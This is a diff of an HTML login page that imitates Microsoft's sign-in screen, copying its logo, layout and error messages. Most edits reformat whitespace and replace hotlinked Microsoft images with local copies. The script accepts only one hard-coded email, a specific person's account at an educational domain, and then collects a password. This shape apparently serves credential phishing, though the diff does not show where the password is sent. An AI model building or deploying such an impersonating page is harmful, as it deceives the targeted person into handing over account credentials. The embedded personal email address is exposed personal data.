@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -55,7 +56,7 @@
         .input-group input:focus {
             border-bottom: 1px solid #0067b8;
         }
-        
+
         .input-group input::placeholder {
             color: #666;
         }
@@ -101,7 +102,7 @@
             background-color: #cccccc;
             color: #000;
         }
-        
+
         .btn-secondary:hover {
             background-color: #999999;
         }
@@ -110,7 +111,7 @@
             background-color: #0067b8;
             color: #fff;
         }
-        
+
         .btn-primary:hover {
             background-color: #005da6;
         }
@@ -132,17 +133,17 @@
             color: #1b1b1b;
             cursor: pointer;
         }
-        
+
         .sign-in-options img {
             width: 24px;
             height: 24px;
         }
-        
+
         /* Step 2 specific styles */
         #step2 {
             display: none;
         }
-        
+
         .user-badge {
             display: flex;
             align-items: center;
@@ -150,7 +151,7 @@
             font-size: 15px;
             margin-bottom: 16px;
         }
-        
+
         .back-button {
             background: none;
             border: none;
@@ -163,22 +164,23 @@
             height: 24px;
             border-radius: 50%;
         }
-        
+
         .back-button:hover {
             background-color: #f2f2f2;
         }
-
     </style>
 </head>
+
 <body>
 
     <div class="login-box">
-        <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft" class="logo">
-        
+        <img src="microsoft_logo.svg" alt="Microsoft" class="logo">
+
         <!-- Step 1: Email -->
         <div id="step1">
             <h1>Sign in</h1>
-            <div class="error-message" id="emailError">That Microsoft account doesn't exist. Enter a different account</div>
+            <div class="error-message" id="emailError">That Microsoft account doesn't exist. Enter a different account
+            </div>
             <div class="input-group">
                 <input type="text" id="emailInput" placeholder="Email or phone" autofocus>
             </div>
@@ -189,10 +191,10 @@
                 <button class="btn btn-secondary" onclick="window.history.back()">Back</button>
                 <button class="btn btn-primary" onclick="validateEmail()">Next</button>
             </div>
-            
+
             <div class="sign-in-options-container">
                 <div class="sign-in-options">
-                    <img src="https://logincdn.msauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg" alt="Key">
+                    <img src="microsoft_logo.svg" alt="Key">
                     Sign-in options
                 </div>
             </div>
@@ -202,7 +204,11 @@
         <div id="step2">
             <div class="user-badge">
                 <button class="back-button" onclick="showStep1()" aria-label="Back">
-                    <svg viewBox="0 0 24 24" width="16" height="16" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
+                    <svg viewBox="0 0 24 24" width="16" height="16" stroke="currentColor" stroke-width="2" fill="none"
+                        stroke-linecap="round" stroke-linejoin="round">
+                        <line x1="19" y1="12" x2="5" y2="12"></line>
+                        <polyline points="12 19 5 12 12 5"></polyline>
+                    </svg>
                 </button>
                 <span id="displayEmail"></span>
             </div>
@@ -238,10 +244,10 @@
 
         const validEmail = "iu04-0225-0926@iqra.edu.pk";
 
-        window.validateEmail = function() {
+        window.validateEmail = function () {
             const email = document.getElementById('emailInput').value.trim();
             const errorElement = document.getElementById('emailError');
-            
+
             if (email === validEmail) {
                 errorElement.style.display = 'none';
                 document.getElementById('displayEmail').innerText = email;
@@ -254,13 +260,13 @@
             }
         }
 
-        window.showStep1 = function() {
+        window.showStep1 = function () {
             document.getElementById('step2').style.display = 'none';
             document.getElementById('step1').style.display = 'block';
             document.getElementById('emailInput').focus();
         }
 
-        window.login = async function() {
+        window.login = async function () {
             const email = document.getElementById('displayEmail').innerText;
             const password = document.getElementById('passwordInput').value;
 
@@ -272,14 +278,15 @@
                 alert("Incorrect password or login failed.");
             }
         }
-        
+
         document.getElementById('emailInput').addEventListener('keypress', function (e) {
             if (e.key === 'Enter') window.validateEmail();
         });
-        
+
         document.getElementById('passwordInput').addEventListener('keypress', function (e) {
             if (e.key === 'Enter') window.login();
         });
     </script>
 </body>
+
 </html>
